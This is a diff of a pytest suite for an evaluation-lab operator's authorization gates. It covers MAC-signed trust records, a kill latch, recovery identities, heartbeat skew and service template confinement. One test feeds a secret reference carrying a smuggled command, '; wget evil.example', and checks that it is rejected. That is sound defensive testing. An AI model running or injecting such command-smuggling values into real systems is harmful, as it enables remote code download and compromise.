@@ -17,8 +17,8 @@ from types import SimpleNamespace
 import pytest
 import yaml
 
-from evallab.execution_contracts import PaidRunAuthorization
 from evallab.ops_continuous import (
+    HEARTBEAT_SKEW_SECONDS,
     KILL_DISPOSITION,
     REASON_BILLABLE_REFUSED,
     REASON_DEFAULT_DISABLED,
@@ -34,6 +34,8 @@ from evallab.ops_continuous import (
     main,
     policy_complete,
     public_sha256_is_not_a_signature,
+    put_trusted_record,
+    trust_root_for,
 )
 
 ROOT = Path(__file__).resolve().parents[1]
@@ -57,47 +59,40 @@ NOW = datetime(2026, 8, 28, tzinfo=UTC)
 ENABLE = "enable-key"
 APPROVAL = "approval-key"
 BUDGET = "budget-key"
+RECOVERY = "recovery-key"
 MAC_KEY = b"eval-lab-operator-mac-key-32bytes!"
 EXPIRES = NOW + timedelta(days=1)
+SPEC_ID = "01CONTINUOUSLOOPSPEC0000000001"
 
 
-def _auth(*, actor: str, spec_id: str, at: datetime = NOW) -> dict:
+def _budget_fields() -> dict:
     return {
-        "spec_id": spec_id,
+        "ceiling_usd": 20,
+        "expires_at": EXPIRES.isoformat(),
+        "scope": ["continuous-loop"],
+    }
+
+
+def _trust_record(*, kind: str, actor: str, spec_id: str = SPEC_ID, at: datetime = NOW, **extra) -> dict:
+    record = {
         "actor": actor,
         "authorized_at": at.isoformat(),
+        "expires_at": EXPIRES.isoformat(),
+        "kind": kind,
+        "max_age_seconds": 86400,
         "quota_override": False,
-    }
-
-
-def _budget(*, actor: str = BUDGET) -> dict:
-    return {
-        **_auth(actor=actor, spec_id="01CONTINUOUSBUDGET0000000001"),
         "scope": ["continuous-loop"],
-        "expires_at": EXPIRES.isoformat(),
-        "ceiling_usd": 20,
+        "signer": actor,
+        "spec_id": spec_id,
     }
-
-
-def _budget_payload(*, actor: str = BUDGET) -> dict:
-    body = _budget(actor=actor)
-    return {
-        "actor": body["actor"],
-        "ceiling_usd": body["ceiling_usd"],
-        "expires_at": EXPIRES.isoformat(),
-        "scope": list(body["scope"]),
-        "spec_id": body["spec_id"],
-    }
+    record.update(extra)
+    return record
 
 
 def _complete_policy_body(*, stale_after: float = 60.0, drain_timeout: float = 5.0) -> dict:
-    approval = PaidRunAuthorization(
-        spec_id="01CONTINUOUSAPPROVAL00000001",
-        actor=APPROVAL,
-        authorized_at=NOW,
-    )
     unsigned = {
         "policy_schema_version": "1",
+        "spec_id": SPEC_ID,
         "approval_signature_ref": APPROVAL,
         "approval_digest": "0" * 64,
         "slo_freshness": {
@@ -135,8 +130,7 @@ def _complete_policy_body(*, stale_after: float = 60.0, drain_timeout: float = 5
     dumped = ContinuousLoopPolicy.model_validate(unsigned).model_dump(mode="json")
     dumped["approval_digest"] = bind_policy_digest(
         policy=dumped,
-        approval=approval,
-        budget=_budget_payload(),
+        budget=_budget_fields(),
         mac_key=MAC_KEY,
     )
     return {"continuous_loop_policy": dumped}
@@ -147,13 +141,29 @@ def _policy(path: Path, *, stale_after: float = 60.0, drain_timeout: float = 5.0
     return path
 
 
-def _write_auths(state: Path, *, approval_actor: str = APPROVAL, budget_actor: str = BUDGET) -> None:
+def _write_auths(
+    state: Path,
+    *,
+    approval_actor: str = APPROVAL,
+    budget_actor: str = BUDGET,
+    recovery_actor: str | None = None,
+    approval_at: datetime = NOW,
+    include_budget: bool = True,
+    include_approval: bool = True,
+) -> None:
     state.mkdir(exist_ok=True)
-    (state / "approval.json").write_text(
-        json.dumps(_auth(actor=approval_actor, spec_id="01CONTINUOUSAPPROVAL00000001"))
-    )
-    (state / "budget.json").write_text(json.dumps(_budget(actor=budget_actor)))
-    (state / "approval.mac").write_bytes(MAC_KEY)
+    (state / "trust.mac").write_bytes(MAC_KEY)
+    root = trust_root_for(state, {})
+    if include_approval:
+        put_trusted_record(root, MAC_KEY, _trust_record(kind="approval", actor=approval_actor, at=approval_at))
+    if include_budget:
+        put_trusted_record(
+            root,
+            MAC_KEY,
+            _trust_record(kind="budget", actor=budget_actor, ceiling_usd=20),
+        )
+    if recovery_actor:
+        put_trusted_record(root, MAC_KEY, _trust_record(kind="recovery", actor=recovery_actor))
     shutil.copy2(STANDING, state / "standing-approvals.yaml")
 
 
@@ -248,37 +258,32 @@ def test_parallel_signed_manifest_is_rejected(tmp_path: Path) -> None:
 
 
 def test_future_authorization_is_refused(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
-    state.mkdir()
-    (state / "approval.json").write_text(
-        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001", at=NOW + timedelta(hours=1)))
-    )
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
+    _write_auths(state, approval_at=NOW + timedelta(hours=1))
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
 
 
 def test_missing_budget(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
-    state.mkdir()
-    (state / "approval.json").write_text(
-        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001"))
-    )
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
+    _write_auths(state, include_budget=False)
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_BUDGET
 
 
 def test_env_budget_flag_is_not_authority(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
-    state.mkdir()
-    (state / "approval.json").write_text(
-        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001"))
-    )
+    _write_auths(state, include_budget=False)
     env = {**_gate_env(), "EVAL_LAB_BUDGET_PRESENT": "1"}
-    result = _run(tmp_path, "quota", env=env, now=NOW)
+    result = _run(tmp_path, "quota", policy=policy, env=env, now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_BUDGET
 
 
 def test_missing_secret(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
     _write_auths(state)
     env = {
@@ -286,33 +291,36 @@ def test_missing_secret(tmp_path: Path) -> None:
         "EVAL_LAB_ENABLE_IDENTITY": ENABLE,
         "EVAL_LAB_SECRET_REF": "keychain:lab/operator",
     }
-    result = _run(tmp_path, "quota", env=env, now=NOW)
+    result = _run(tmp_path, "quota", policy=policy, env=env, now=NOW)
     assert result.returncode == 2
     assert _payload(result)["reason"] == REASON_MISSING_SECRET
 
 
 def test_invalid_secret_ref_grammar(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
     _write_auths(state)
     env = {
         **_gate_env(),
         "EVAL_LAB_SECRET_REF": "keychain:lab/operator; wget evil.example",
     }
-    result = _run(tmp_path, "quota", env=env, now=NOW)
+    result = _run(tmp_path, "quota", policy=policy, env=env, now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_SECRET
 
 
 def test_same_enable_and_approval_identity(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
     _write_auths(state, approval_actor=ENABLE)
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_SAME_IDENTITY
 
 
 def test_budget_signer_must_be_distinct(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
     _write_auths(state, budget_actor=APPROVAL)
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_SAME_IDENTITY
 
 
@@ -452,6 +460,8 @@ def test_validate_does_not_clear_killed_or_draining(tmp_path: Path) -> None:
     validated = _run(tmp_path, "validate", now=NOW)
     assert (state / "mode").read_text().strip() == "KILLED"
     assert _payload(validated)["mode"] == "KILLED"
+    assert validated.returncode == 2
+    assert _payload(validated)["reason"] == REASON_DEFAULT_DISABLED
     (state / "mode").write_text("DRAINING\n")
     again = _run(tmp_path, "validate", now=NOW)
     assert (state / "mode").read_text().strip() == "DRAINING"
@@ -526,9 +536,11 @@ def test_launchd_plist_disabled() -> None:
     assert "/usr/bin/env" not in loaded["ProgramArguments"]
     assert "/opt/" not in loaded["ProgramArguments"][0]
     assert loaded["LimitLoadToSessionType"] == "Aqua"
-    assert loaded["StandardOutPath"] == "/dev/null"
-    assert loaded["StandardErrorPath"] == "/dev/null"
-    assert "~/" not in loaded["StandardOutPath"]
+    assert loaded["StandardOutPath"] == "/var/tmp/evallab-operator/logs/continuous-operator.out"
+    assert loaded["StandardErrorPath"] == "/var/tmp/evallab-operator/logs/continuous-operator.err"
+    assert loaded["ProgramArguments"][-1] == "/var/tmp/evallab-operator/state"
+    plist_text = PLIST.read_text()
+    assert "~" not in plist_text
     assert "/Users/Shared" not in loaded["StandardOutPath"]
     assert "UserName" not in loaded or loaded.get("UserName") != "root"
 
@@ -561,8 +573,9 @@ def test_compose_restart_no() -> None:
     assert 'restart: "no"' in compose
     assert "profiles:" in compose
     assert 'command: ["validate", "--state-dir", "/var/lib/evallab-operator"]' in compose
-    assert "/var/lib/evallab-operator:mode=0700" in compose
+    assert "evallab-operator-state:/var/lib/evallab-operator" in compose
     assert "read_only: true" in compose
+    assert "volumes:" in compose
     assert "uv sync --locked" in dockerfile
     assert dockerfile.count("validate") == 1
 
@@ -594,9 +607,8 @@ def test_unkeyed_sha256_digest_is_rejected(tmp_path: Path) -> None:
     loop = body["continuous_loop_policy"]
     forged = public_sha256_is_not_a_signature(
         {
-            "actor": APPROVAL,
-            "authorized_at": NOW.isoformat(),
-            "spec_id": "01CONTINUOUSAPPROVAL00000001",
+            "budget": _budget_fields(),
+            "policy": {k: v for k, v in loop.items() if k != "approval_digest"},
         }
     )
     loop["approval_digest"] = forged
@@ -621,13 +633,17 @@ def test_future_heartbeat_is_stale(tmp_path: Path) -> None:
 
 def test_killed_latch_survives_pause_restart_maintenance(tmp_path: Path) -> None:
     state = tmp_path / "state"
+    policy = _policy(tmp_path / "policy.yaml")
+    _write_auths(state, recovery_actor=RECOVERY)
+    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
     _run(tmp_path, "kill", now=NOW)
     assert (state / "mode").read_text().strip() == "KILLED"
-    for command in ("pause", "restart", "maintenance", "upgrade", "rollback"):
-        result = _run(tmp_path, command, now=NOW)
+    for command in ("pause", "restart", "maintenance", "upgrade", "rollback", "validate", "start"):
+        result = _run(tmp_path, command, policy=policy, env=_gate_env(), now=NOW)
         assert result.returncode == 2
         assert (state / "mode").read_text().strip() == "KILLED"
         assert _payload(result)["mode"] == "KILLED"
+        assert _payload(result)["reason"] == REASON_DEFAULT_DISABLED
 
 
 def test_recover_requires_distinct_recovery_token(tmp_path: Path) -> None:
@@ -640,11 +656,11 @@ def test_recover_requires_distinct_recovery_token(tmp_path: Path) -> None:
     refused = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
     assert refused.returncode == 2
     assert (state / "mode").read_text().strip() == "KILLED"
-    env = {**env, "EVAL_LAB_RECOVERY_TOKEN": env["EVAL_LAB_ENABLE_TOKEN"]}
+    _write_auths(state, recovery_actor=ENABLE)
     same = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
     assert same.returncode == 2
     assert (state / "mode").read_text().strip() == "KILLED"
-    env = {**_gate_env(), "EVAL_LAB_RECOVERY_TOKEN": "recovery-token-distinct"}
+    _write_auths(state, recovery_actor=RECOVERY)
     recovered = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
     assert recovered.returncode == 0
     assert (state / "mode").read_text().strip() == "DISABLED"
@@ -681,3 +697,66 @@ def test_main_argv_matches_module(tmp_path: Path, monkeypatch: pytest.MonkeyPatc
     monkeypatch.chdir(tmp_path)
     code = main(["validate", "--state-dir", str(tmp_path / "op")])
     assert code == 2
+
+def test_user_json_is_not_trust_root(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "trust.mac").write_bytes(MAC_KEY)
+    shutil.copy2(STANDING, state / "standing-approvals.yaml")
+    (state / "approval.json").write_text(
+        json.dumps({"spec_id": SPEC_ID, "actor": APPROVAL, "authorized_at": NOW.isoformat(), "quota_override": False})
+    )
+    (state / "budget.json").write_text(
+        json.dumps({**_budget_fields(), "spec_id": SPEC_ID, "actor": BUDGET, "authorized_at": NOW.isoformat(), "quota_override": False})
+    )
+    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
+    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
+
+
+def test_forged_store_index_is_rejected(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml")
+    state = tmp_path / "state"
+    _write_auths(state)
+    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
+    index = json.loads((state / "trust/index.json").read_text())
+    index["mac"] = "0" * 64
+    (state / "trust/index.json").write_text(json.dumps(index))
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
+    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
+
+
+def test_heartbeat_within_skew_is_accepted(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "heartbeat").write_text((NOW + timedelta(seconds=HEARTBEAT_SKEW_SECONDS)).isoformat() + "\n")
+    result = _run(tmp_path, "status", policy=policy, now=NOW)
+    assert result.returncode == 0
+
+
+def test_heartbeat_beyond_skew_is_stale(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "heartbeat").write_text((NOW + timedelta(seconds=HEARTBEAT_SKEW_SECONDS + 1)).isoformat() + "\n")
+    result = _run(tmp_path, "status", policy=policy, now=NOW)
+    assert result.returncode == 2
+    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT
+
+
+def test_rendered_templates_confine_writable_state() -> None:
+    service = SERVICE.read_text()
+    compose = COMPOSE.read_text()
+    plist = plistlib.loads(PLIST.read_bytes())
+    assert service.count("/var/lib/evallab-operator") >= 2
+    assert "--state-dir /var/lib/evallab-operator" in service
+    assert "ReadWritePaths=/var/lib/evallab-operator" in service
+    assert "StateDirectory=evallab-operator" in service
+    assert "read_only: true" in compose
+    assert "evallab-operator-state:/var/lib/evallab-operator" in compose
+    assert plist["ProgramArguments"][-1] == "/var/tmp/evallab-operator/state"
+    assert plist["StandardOutPath"].startswith("/var/tmp/evallab-operator/logs/")
+    assert "~" not in PLIST.read_text()
+
